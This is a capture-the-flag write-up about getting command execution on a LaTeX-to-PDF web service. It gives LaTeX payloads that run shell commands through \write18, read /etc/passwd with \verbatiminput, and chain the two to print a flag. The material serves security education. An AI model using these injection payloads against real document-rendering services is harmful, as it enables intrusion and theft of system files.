# UnderLeaf
The website renders LaTeX to PDF. The description says that we need to
run `/readflag` to get the flag so we know that we need to get RCE.
As LaTeX has the command `\write18` that runs arbitrary commands, 
while not enabled by default we can try it, with the following payload
```
\documentclass{article}
\begin{document}
\immediate\write18{sleep 5}
\end{document}
```

As we also control the preamble we can include any package.
Including the verbatim package we can get an easy file read as well.
```
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/etc/passwd}
\end{document}
```

Now we have a blind RCE and a file read primitve so we can chain them together
by writing the output of `/readflag` to a file and then including the file.
```
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{/readflag > /tmp/output}
\verbatiminput{/tmp/output}
\end{document}
```
With this payload we get the flag displayed on the PDF 
`gg{Pi_eQuaLs_3!!}`

